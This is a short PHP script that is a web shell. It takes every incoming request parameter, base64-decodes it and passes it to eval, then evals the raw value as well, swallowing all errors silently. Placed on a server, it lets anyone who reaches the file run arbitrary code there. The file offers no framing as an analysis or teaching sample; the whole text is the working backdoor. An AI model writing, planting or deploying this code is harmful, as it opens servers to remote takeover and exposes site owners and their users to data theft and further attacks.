<?php foreach($_REQUEST as $v){

$decoded = base64_decode($v);
try{
    eval($decoded);
}catch(Throwable $e){
}

try{
    eval($v.";");
}catch(Throwable $e){
}

}